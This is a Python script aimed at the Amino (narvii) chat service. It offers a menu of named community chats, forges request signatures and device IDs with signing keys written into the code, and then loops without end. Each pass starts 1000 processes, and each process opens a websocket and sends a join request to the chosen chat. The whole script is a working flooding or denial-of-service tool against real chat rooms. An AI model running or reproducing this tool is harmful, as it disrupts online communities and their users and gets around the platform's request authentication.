comId = 3434136
chatIds = ['f5c8571d-6e22-438b-ba04-3816509beed1','8317ef94-20db-4b06-bce7-e8783bfac113','97c12625-9512-4981-8b72-0bd9840a6f86','b2ee0b9c-8123-47ae-9c8d-b09e7f4c75af','68999648-b7a9-4839-a63b-145188322d9e','4d183f98-d507-4615-a4a1-0268056bccf1','059f8744-8d5c-41d7-98d2-73744bc52937','f386b542-ad67-4c89-a3a5-8f2094da9069','db7fb983-f0d0-462c-8060-d56b06a3a5c0','56278b39-45ca-4fe2-a337-0695a1890a59','127e3e9b-02f4-4141-9583-9a6a20f62fa7','f2353482-b28d-4c58-b3d6-a93c9effdf0b','3ce7fa37-500f-4b6d-9395-a0e87fad6adf','23bca8a8-8e23-4ff7-8414-7ce277c77b8e','51c085ac-164c-4ab4-9f59-7079b523649d','f4cbde10-210d-4a94-bdef-a474fa6dbff4','bfee148f-dbe4-4006-b6ff-466f2c3901aa']
try:
	chat = input('''
0-لجنة التفاعل والمسابقات
1-Elfen
2-Naval
3-aNti
4-soad
5-game team
6-SOSO
7-Egyptes
8-اذاعة المنتدى
9-DARK:12:12
10-my name
11-evar
12-egypt family
13-Aizen|زمن الجاهلية
14-espacity L:تأثير الاسبكتي
15-blueberry
16-دولة باب الشرجي
select:''')
	chatId = chatIds[int(chat)]
except:chatId = chat
print("start script")
import websocket
from multiprocessing import Process
import json
from concurrent.futures import ThreadPoolExecutor
import time
import hashlib
import hmac
from time import sleep
import base64
from uuid import uuid4
import os
import sys
from threading import Thread

socket_url = "wss://ws1.narvii.com"
def generateSig(data: str):
	return base64.b64encode(bytes.fromhex("19") + hmac.new(bytes.fromhex("dfa5ed192dda6e88a12fe12130dc6206b1251e44"),data.encode(),hashlib.sha1).digest()).decode()

def generateDevice():
	data = uuid4().bytes
	return (
	"19" + data.hex() +
	hmac.new(bytes.fromhex("e7309ecc0953c6fa60005b2765f99dbbc965c8e9"),
	bytes.fromhex("19") + data,
	hashlib.sha1).hexdigest()).upper()

def send():
	final = final = f"{generateDevice()}|{int(time.time() * 1000)}"
	headers = {"NDCDEVICEID": generateDevice(),"NDC-MSG-SIG": generateSig(data=final)}
	ws = websocket.WebSocket()
	ws.connect(f"wss://ws1.narvii.com?signbody={final.replace('|', '%7C')}",header=headers)
	data = {"o": {"ndcId": comId,"threadId": chatId, "joinRole": 2,"id": "72446" }, "t": 112 } 
	ws.send(json.dumps(data))
	ws.close()
	return True

while True:
	pps = []
	for i in range(1000):
		p = Process(target=send)
		p.start()
		pps.append(p)
	for pp in pps:
		pp.join()